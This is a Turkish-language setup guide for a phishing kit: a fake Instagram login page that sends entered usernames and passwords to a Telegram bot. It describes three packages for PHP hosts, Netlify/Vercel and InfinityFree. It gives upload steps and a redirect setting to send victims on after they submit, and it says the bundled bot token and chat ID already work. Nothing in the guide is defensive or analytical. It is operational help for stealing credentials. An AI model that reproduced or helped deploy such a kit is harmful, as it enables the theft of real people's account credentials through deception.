# Instagram Clone Kurulum Kılavuzu

Bu proje, Instagram benzeri bir login formu içeren ve girilen bilgileri Telegram botuna ileten bir web uygulamasıdır.

## Paket İçeriği

Projede 3 farklı seçenek sunan paketler bulunmaktadır:

### 1. Static Version (static_version_instagram_clone.zip)
- Basit statik dosyalardan oluşan, PHP proxy kullanarak Telegram API ile iletişim kuran versiyon
- PHP desteği olan herhangi bir web sunucusunda çalışabilir
- InfinityFree, 000webhost gibi ücretsiz PHP hostinglerde de çalışabilir

### 2. Deploy Package (deploy_package_instagram_clone.zip)
- Netlify, Vercel gibi modern platformlarda dağıtıma hazır paket
- JavaScript ile frontend tarafında çalışan, PHP gerekmeden doğrudan API erişimi olan versiyon
- CORS sorunlarına karşı daha dayanıklı

### 3. InfinityFree Package (infinityfree_instagram_clone.zip)
- InfinityFree hosting için özel olarak hazırlanmış paket
- /htdocs klasör yapısına uygun dosya organizasyonu
- PHP proxy ile güvenli API erişimi

## Kurulum Adımları

### Static Version için:

1. `static_version_instagram_clone.zip` dosyasını indirin ve ZIP'ten çıkarın
2. Tüm dosyaları web sunucunuzun ana dizinine (public_html, www vs.) yükleyin
3. `proxy.php` dosyasının çalıştırılabilir olduğundan emin olun
4. Tarayıcınızda ana sayfayı açarak test edin

### InfinityFree ile Kurulum:

1. `infinityfree_instagram_clone.zip` dosyasını indirin ve ZIP'ten çıkarın
2. InfinityFree hesabı oluşturun ve kontrol paneline giriş yapın
3. File Manager üzerinden `/htdocs` dizinine erişin
4. Dosyaları yükleyin, klasör yapısını koruyun
5. İçerisindeki `INFINITYFREE_KURULUM.md` dosyasındaki detaylı talimatları takip edin

## Özelleştirme

- `telegram.js` dosyasındaki `REDIRECT_URL` değişkenini değiştirerek, kullanıcının form gönderimi sonrası yönlendirileceği URL'i belirleyebilirsiniz
- Telegram bot token ve chat ID değerlerini gerekirse güncelleyebilirsiniz (şu an çalışan değerler kullanılmaktadır)

## Sorun Giderme

- Giriş bilgileri Telegram'a iletilmiyorsa, tarayıcı konsolunda hataları kontrol edin
- InfinityFree'de çalışma sorunları yaşıyorsanız, `INFINITYFREE_KURULUM.md` dosyasındaki sorun giderme bölümüne bakın
- Web sunucunuzun PHP ve cURL desteği olduğundan emin olun